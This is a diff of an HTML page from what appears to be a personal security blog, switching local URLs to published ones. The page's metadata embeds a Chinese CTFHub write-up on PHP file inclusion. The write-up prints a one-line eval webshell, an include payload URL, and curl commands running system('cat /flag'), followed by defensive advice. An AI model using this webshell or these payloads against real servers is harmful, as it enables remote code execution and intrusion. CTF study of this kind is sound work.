@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>CTFHub 文件包含实战：利用一句话木马 getshell | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, 文件包含, PHP, 一句话木马, 蚁剑, CTFHub">
 <meta name="description" content="一、题目信息
@@ -63,16 +63,16 @@ http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt
 4.1 include 函数的关键特性
 假设 index.php 中执行了：">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/ctfhub-file-inclusion-shell/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/ctfhub-file-inclusion-shell/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/">
 <noscript>
     <style>
         #theme-toggle,
@@ -118,13 +118,96 @@ http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="CTFHub 文件包含实战：利用一句话木马 getshell">
+  <meta property="og:description" content="一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html
+二、源码分析 进入题目后，直接给出了 PHP 源码：
+&lt;?php error_reporting(0); // 关闭报错显示 if (isset($_GET[&#39;file&#39;])) { // 接收 file 参数 if (strpos($_GET[&#39;file&#39;], &#34;flag&#34;) !== false) { // 如果包含 &#34;flag&#34; 字符串 echo &#34;hack&#34;; // 输出 hack，阻止访问 } else { include($_GET[&#39;file&#39;]); // 否则包含指定文件 } } ?&gt; 逻辑梳理 条件 结果 file 参数包含 &#34;flag&#34; 输出 hack，包含失败 file 参数不含 &#34;flag&#34; 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。
+三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：
+http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt 内容是一句话木马：
+&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt; 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST[&#39;ctfhub&#39;] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-05T23:10:00+08:00">
+    <meta property="article:modified_time" content="2026-06-05T23:10:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="文件包含">
+    <meta property="article:tag" content="PHP">
+    <meta property="article:tag" content="一句话木马">
+    <meta property="article:tag" content="蚁剑">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CTFHub 文件包含实战：利用一句话木马 getshell">
+  <meta name="twitter:description" content="一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html
+二、源码分析 进入题目后，直接给出了 PHP 源码：
+&lt;?php error_reporting(0); // 关闭报错显示 if (isset($_GET[&#39;file&#39;])) { // 接收 file 参数 if (strpos($_GET[&#39;file&#39;], &#34;flag&#34;) !== false) { // 如果包含 &#34;flag&#34; 字符串 echo &#34;hack&#34;; // 输出 hack，阻止访问 } else { include($_GET[&#39;file&#39;]); // 否则包含指定文件 } } ?&gt; 逻辑梳理 条件 结果 file 参数包含 &#34;flag&#34; 输出 hack，包含失败 file 参数不含 &#34;flag&#34; 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。
+三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：
+http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt 内容是一句话木马：
+&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt; 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST[&#39;ctfhub&#39;] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTFHub 文件包含实战：利用一句话木马 getshell",
+      "item": "https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFHub 文件包含实战：利用一句话木马 getshell",
+  "name": "CTFHub 文件包含实战：利用一句话木马 getshell",
+  "description": "一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html\n二、源码分析 进入题目后，直接给出了 PHP 源码：\n\u0026lt;?php error_reporting(0); // 关闭报错显示 if (isset($_GET[\u0026#39;file\u0026#39;])) { // 接收 file 参数 if (strpos($_GET[\u0026#39;file\u0026#39;], \u0026#34;flag\u0026#34;) !== false) { // 如果包含 \u0026#34;flag\u0026#34; 字符串 echo \u0026#34;hack\u0026#34;; // 输出 hack，阻止访问 } else { include($_GET[\u0026#39;file\u0026#39;]); // 否则包含指定文件 } } ?\u0026gt; 逻辑梳理 条件 结果 file 参数包含 \u0026quot;flag\u0026quot; 输出 hack，包含失败 file 参数不含 \u0026quot;flag\u0026quot; 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。\n三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：\nhttp://\u0026lt;TARGET_IP\u0026gt;:\u0026lt;PORT\u0026gt;/shell.txt 内容是一句话木马：\n\u0026lt;?php eval($_REQUEST[\u0026#39;ctfhub\u0026#39;]);?\u0026gt; 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST['ctfhub'] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：\n",
+  "keywords": [
+    "CTF", "Web安全", "文件包含", "PHP", "一句话木马", "蚁剑", "CTFHub"
+  ],
+  "articleBody": "一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html\n二、源码分析 进入题目后，直接给出了 PHP 源码：\n\u003c?php error_reporting(0); // 关闭报错显示 if (isset($_GET['file'])) { // 接收 file 参数 if (strpos($_GET['file'], \"flag\") !== false) { // 如果包含 \"flag\" 字符串 echo \"hack\"; // 输出 hack，阻止访问 } else { include($_GET['file']); // 否则包含指定文件 } } ?\u003e 逻辑梳理 条件 结果 file 参数包含 \"flag\" 输出 hack，包含失败 file 参数不含 \"flag\" 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。\n三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：\nhttp://:/shell.txt 内容是一句话木马：\n\u003c?php eval($_REQUEST['ctfhub']);?\u003e 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST['ctfhub'] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：\ninclude('shell.txt'); 不管 shell.txt 的后缀名是什么（.txt、.jpg、.log 都可以），文件中的内容都会被当作 PHP 代码执行。\n也就是说，shell.txt 里的 \u003c?php eval($_REQUEST['ctfhub']);?\u003e 会在 index.php 的上下文中运行，相当于 index.php 自身具备了 eval 的能力。\n4.2 构造 Payload 利用 file 参数包含 shell.txt：\nhttp://:/?file=shell.txt 此时页面已经「感染」了一句话木马。接下来只需要向该 URL 发送 ctfhub 参数即可执行任意 PHP 代码。\n五、蚁剑连接 5.1 添加 Shell 打开蚁剑，右键「添加数据」：\n字段 值 URL http://:/?file=shell.txt 连接密码 ctfhub 编码器 default 5.2 获取 Flag 连接成功后，在蚁剑终端执行：\ncat /flag 即可拿到 flag。\n六、不用蚁剑？curl 一样可以打 蚁剑的本质就是帮你发送 HTTP 请求。手动用 curl 完全等价：\n步骤 1：先包含木马 curl \"http://challenge-xxx.sandbox.ctfhub.com:10080/?file=shell.txt\" 步骤 2：执行命令 # 查看当前目录 curl -X POST \"http://challenge-xxx/?file=shell.txt\" \\ -d \"ctfhub=system('ls');\" # 读取 flag curl -X POST \"http://challenge-xxx/?file=shell.txt\" \\ -d \"ctfhub=system('cat /flag');\" 步骤 3：如果用 GET 方式 curl \"http://challenge-xxx/?file=shell.txt\u0026ctfhub=system('cat /flag');\" 七、考点总结 知识点 核心内容 include() / require() 不检查后缀，被包含文件的内容直接在当前 PHP 上下文中执行 一句话木马 \u003c?php eval($_REQUEST['x']);?\u003e 是最经典的 WebShell 形式 伪协议绕过 如果无法上传文件，可用 php://input、data:// 等伪协议直接注入代码 黑名单绕过 题目过滤了 \"flag\" 字符串，但没有过滤 shell.txt，属于黑名单不完整 八、防御建议 白名单校验：只允许包含指定目录下的特定文件\n$allowed = ['header.php', 'footer.php']; if (!in_array($_GET['file'], $allowed)) { die('Invalid file'); } 关闭危险协议\nallow_url_include = Off allow_url_fopen = Off 使用 open_basedir 限制 PHP 可访问的目录范围\nWAF 拦截：对 file 参数中的 ../、php://、data:// 等关键字进行过滤\n九、结语 这道题虽然简单，但涵盖了文件包含漏洞最经典的利用链条：\n发现 include 漏洞 → 找到可包含的恶意文件 → 利用 include 特性执行 WebShell → getshell → 读 flag\n在实际渗透测试中，很多 CMS 和框架的历史漏洞都是这个套路的变体。理解 include() 函数「不检查后缀直接执行」这一特性，是掌握文件包含漏洞的关键。\n参考来源：CTFHub 文件包含 WriteUp（原创投稿：Jazz）\n",
+  "wordCount" : "265",
+  "inLanguage": "en",
+  "datePublished": "2026-06-05T23:10:00+08:00",
+  "dateModified": "2026-06-05T23:10:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -150,27 +233,27 @@ http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -373,20 +456,20 @@ http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/php/">PHP</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E8%9A%81%E5%89%91/">蚁剑</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/ctfhub/">CTFHub</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/php/">PHP</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E8%9A%81%E5%89%91/">蚁剑</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctfhub/">CTFHub</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/php-filter-read-source-code/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/php-filter-read-source-code/">
     <span class="title">« Prev</span>
     <span>php://filter 伪协议：在文件包含中读取源代码</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/php-input-file-inclusion/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/php-input-file-inclusion/">
     <span class="title">Next »</span>
     <span>php://input 文件包含漏洞利用：从原理到实战</span>
   </a>
@@ -397,7 +480,7 @@ http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
